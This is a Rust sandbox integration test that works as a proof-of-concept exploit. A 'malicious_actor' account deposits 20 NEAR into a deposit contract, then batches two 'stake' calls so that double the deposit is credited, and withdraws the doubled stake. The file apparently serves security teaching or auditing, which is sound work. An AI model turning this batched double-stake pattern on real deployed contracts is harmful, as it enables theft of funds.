// macro allowing us to convert human readable units to workspace units.
use near_sdk::{json_types::U128, Gas, NearToken};
use near_workspaces::{operations::Function, Account, Contract};
// macro allowing us to convert args into JSON bytes to be read by the
// contract.
use serde_json::json;

const TGAS: u64 = 1_000_000_000_000;

const DEPOSIT_CONTRACT: &[u8] =
    include_bytes!("../../res/deposit_contract.wasm");
const STAKING_CONTRACT: &[u8] = include_bytes!("../../res/staking.wasm");

const DEPOSIT_AMOUNT: NearToken = NearToken::from_near(20);

// Prepares and deploys RACE CONDITION contracts
async fn prepare_race_condition(
) -> color_eyre::Result<(Contract, Contract, Account)> {
    let worker = near_workspaces::sandbox().await?;
    let deposit_contract = worker.dev_deploy(DEPOSIT_CONTRACT).await?;
    let staking_contract = worker.dev_deploy(STAKING_CONTRACT).await?;
    let malicious_actor = worker.dev_create_account().await?;

    let _ = deposit_contract
        .call("new")
        .args_json(json!({"staking_contract": staking_contract.id(),}))
        .transact()
        .await?;

    println!(
        "Deposit contract deployed: {}",
        deposit_contract.id().to_string()
    );

    let _ = staking_contract
        .call("new")
        .args_json(json!({"account": deposit_contract.id(),}))
        .transact()
        .await?;

    println!("Staking contract deployed: {:#?}", staking_contract.id());

    Ok((deposit_contract, staking_contract, malicious_actor))
}

#[tokio::test]
async fn exploit_race_condition() -> color_eyre::Result<()> {
    let (deposit_contract, staking_contract, malicious_actor): (
        Contract,
        Contract,
        Account,
    ) = prepare_race_condition().await?;

    //Deposit into deposit contract
    let res = malicious_actor
        .call(deposit_contract.id(), "deposit_near")
        .deposit(DEPOSIT_AMOUNT)
        .transact()
        .await?;

    assert!(res.is_success(), "Deposit Failed: {:?}", res.failures());

    println!("Deposited: {:?}", res.logs());

    // Constructing batch call ourselves

    malicious_actor
        .batch(deposit_contract.id())
        .call(
            Function::new("stake")
                .args_json(
                    json!({"validator":"test.near".to_string(), "amount":U128(DEPOSIT_AMOUNT.as_yoctonear())})
                )
                .gas(Gas::from_tgas(29))
        )
        .call(
            Function::new("stake")
                .args_json(
                    json!({"validator":"test.near".to_string(), "amount":U128(DEPOSIT_AMOUNT.as_yoctonear())})
                )
                .gas(Gas::from_tgas(29))
        )
        .transact().await?.into_result()?;

    let staked_amount = staking_contract
        .call("view_stake")
        .args_json(
            json!({"account":malicious_actor.id(), "validator":"test.near"}),
        )
        .transact()
        .await?
        .into_result()?
        .json::<U128>()?;

    assert_eq!(staked_amount.0, DEPOSIT_AMOUNT.as_yoctonear() * 2);

    println!("Staked amount:{:?}", staked_amount);

    let exploit_contract_balance =
        malicious_actor.view_account().await?.balance;

    println!(
        "Exploit contract balance before withdraw: {}\n",
        exploit_contract_balance
    );

    let res = malicious_actor
        .call(staking_contract.id(), "withdraw_stake")
        .args_json(
            json!(
            {"validator":"test.near".to_string(), "amount":U128(DEPOSIT_AMOUNT.as_yoctonear() * 2)})
        )
        .transact().await?;

    assert!(res.is_success(), "Withdraw Failed: {:?}", res.failures());
    println!("Withdrawn: {:?}", res.logs());

    let exploit_contract_balance =
        malicious_actor.view_account().await?.balance;

    println!(
        "Exploit contract balance after withdraw: {}\n",
        exploit_contract_balance
    );

    let staked_amount = staking_contract
        .call("view_stake")
        .args_json(
            json!({"account":malicious_actor.id(), "validator":"test.near"}),
        )
        .transact()
        .await?
        .json::<U128>()
        .unwrap();

    assert_eq!(staked_amount.0, 0);

    println!("Staked amount:{:?}", staked_amount);

    Ok(())
}
